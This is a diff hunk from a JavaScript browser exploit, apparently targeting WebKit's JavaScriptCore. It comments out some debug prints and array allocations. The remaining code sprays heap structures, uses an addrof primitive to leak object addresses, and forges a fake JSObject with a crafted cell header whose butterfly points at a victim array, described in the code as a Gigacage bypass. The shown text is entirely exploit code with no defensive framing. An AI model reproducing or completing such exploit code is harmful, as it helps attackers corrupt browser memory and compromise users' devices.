@@ -509,20 +509,20 @@ for (var i = 0; i < 1000; ++i) { //spray 1000 array no needed though it just bet
         var victim1 = structure_spray[510];
         // Gigacage bypass: Forge a JSObject which has its butterfly pointing
         // to victim
-        var boxed1 = [{}];
+        //var boxed1 = [{}];
         var print = (msg) => {
           port.postMessage(msg);
         }
-        print("unboxed @ " + new Int64(addrof(unboxed1)));
-        print("boxed @ " + new Int64(addrof(boxed1)));
+        //print("unboxed @ " + new Int64(addrof(unboxed1)));
+        //print("boxed @ " + new Int64(addrof(boxed1)));
 
     var container = {
         header: qwordAsTagged(0x0108230900000000), // cell
         butterfly: victim1, // butterfly
     };
-    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
-    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
-    var boxed = [{}];
+    //var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
+    //unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
+    //var boxed = [{}];
 
     print("outer @ " + new Int64(addrof(container)+0x10));
 
